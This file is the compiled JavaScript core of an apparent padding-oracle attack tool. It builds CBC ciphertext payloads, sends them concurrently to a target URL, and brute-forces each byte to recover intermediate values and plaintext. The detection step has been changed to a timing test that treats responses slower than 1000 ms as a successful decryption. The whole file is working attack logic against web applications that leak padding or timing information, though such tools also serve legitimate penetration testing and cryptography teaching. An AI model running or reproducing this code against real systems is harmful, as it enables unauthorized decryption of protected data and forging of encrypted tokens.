"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const bluebird_1 = __importDefault(require("./bluebird")); // eslint-disable-line import/order
const ow_1 = __importDefault(require("ow"));
const lodash_1 = require("lodash");
const logging_1 = require("./logging");
const promises_1 = __importDefault(require("./promises"));
const oracle_caller_1 = __importDefault(require("./oracle-caller"));
const PaddingOracle = (options) => {
    const { networkStats, callOracle } = oracle_caller_1.default(options);
    const { ciphertext, plaintext, origBytes, foundBytes, interBytes, foundOffsets, url: _url, blockSize, blockCount, startFromFirstBlock, transformPayload, concurrency = 128, isDecryptionSuccess, logMode = 'full', isCacheEnabled = true, initFirstPayloadBlockWithOrigBytes = false } = options;
    ow_1.default(_url, 'url', ow_1.default.string);
    ow_1.default(blockSize, ow_1.default.number);
    ow_1.default(concurrency, ow_1.default.number);
    ow_1.default(isDecryptionSuccess, ow_1.default.function);
    if (transformPayload)
        ow_1.default(transformPayload, ow_1.default.function);
    ow_1.default(logMode, ow_1.default.string);
    let stopLoggingProgress = false;
    function constructPayload({ byteI, blockI, byte, currentPadding }) {
        const firstBlock = Buffer.alloc(blockSize);
        if (initFirstPayloadBlockWithOrigBytes)
            ciphertext.copy(firstBlock, 0, blockI * blockSize);
        firstBlock[byteI] = byte;
        for (const i of lodash_1.range(byteI + 1, blockSize)) {
            const offset = (blockSize * blockI) + i;
            const interByte = interBytes[offset];
            firstBlock[i] = interByte ^ currentPadding;
        }
        const start = (blockI + 1) * blockSize;
        const secondBlock = ciphertext.slice(start, start + blockSize);
        const twoBlocks = Buffer.concat([firstBlock, secondBlock]);
        return { twoBlocks };
    }
    let badErrorArgConfidence = 0;
    function byteFound({ offset, byte, currentPadding }) {
        const origByte = origBytes[offset]; // plaintext or ciphertext
        if (byte === origByte)
            badErrorArgConfidence++;
        const interByte = byte ^ currentPadding;
        const foundByte = origByte ^ interByte;
        foundBytes[offset] = foundByte;
        interBytes[offset] = interByte;
        foundOffsets.add(offset);
    }
    async function processByte({ blockI, byteI, byte, currentPadding, offset }) {
        const { twoBlocks } = constructPayload({ blockI, byteI, byte, currentPadding });
        if (foundOffsets.has(offset))
            return true;

        const itt = 1;
        let avg = 0;
        for (let i = 0; i < itt; ++i) {
            const start = Date.now();
            await callOracle(twoBlocks);
            avg += Date.now() - start;
        }
        avg = avg / itt;
        const decryptionSuccess = avg > 1000; //isDecryptionSuccess(req);

        if (decryptionSuccess)
            byteFound({ offset, byte, currentPadding });
        if (logMode === 'full' && !stopLoggingProgress) {
            if (!(foundOffsets.has(offset) && !decryptionSuccess)) { // make sure concurrency doesn't cause former bytes progress to be logged after later byte
                logging_1.logProgress({ ciphertext, plaintext, foundOffsets, blockSize, blockI, byteI, byte, decryptionSuccess, networkStats, startFromFirstBlock, isCacheEnabled });
            }
        }
        return decryptionSuccess;
    }
    const isDecrypting = origBytes === ciphertext;
    async function processBlock(blockI) {
        let warningPrinted = false;
        for (const byteI of lodash_1.range(blockSize - 1, -1)) {
            const currentPadding = blockSize - byteI;
            const offset = (blockSize * blockI) + byteI;
            if (foundOffsets.has(offset))
                continue;
            const cipherByte = ciphertext[offset];
            const byteRange = isDecrypting
                ? lodash_1.range(0, 256).filter(b => b !== cipherByte)
                : lodash_1.range(0, 256);
            if (concurrency > 1) {
                const promises = byteRange.map(byte => bluebird_1.default.method(() => processByte({ blockI, byteI, byte, currentPadding, offset })));
                await promises_1.default(promises, { concurrency });
            }
            else {
                for (const byte of byteRange) {
                    const success = await processByte({ blockI, byteI, byte, currentPadding, offset });
                    if (success)
                        break;
                }
            }
            if (isDecrypting && !foundOffsets.has(offset)) {
                await processByte({ blockI, byteI, byte: cipherByte, currentPadding, offset });
            }
            if (!foundOffsets.has(offset)) {
                throw Error(`Padding oracle failure for offset: 0x${offset.toString(16)}. Try again or check the parameter you provided for determining decryption success.`);
            }
            if (!warningPrinted && badErrorArgConfidence > (blockSize / 2)) {
                logging_1.logWarning('The parameter you provided for determining decryption success seems to be incorrect.');
                warningPrinted = true;
            }
        }
    }
    async function processBlocks() {
        const blockIndexes = startFromFirstBlock ? lodash_1.range(blockCount - 1) : lodash_1.range(blockCount - 2, -1);
        for (const blockI of blockIndexes) {
            await processBlock(blockI);
        }
        stopLoggingProgress = true;
    }
    return { processBlocks, callOracle };
};
exports.default = PaddingOracle;
//# sourceMappingURL=padding-oracle.js.map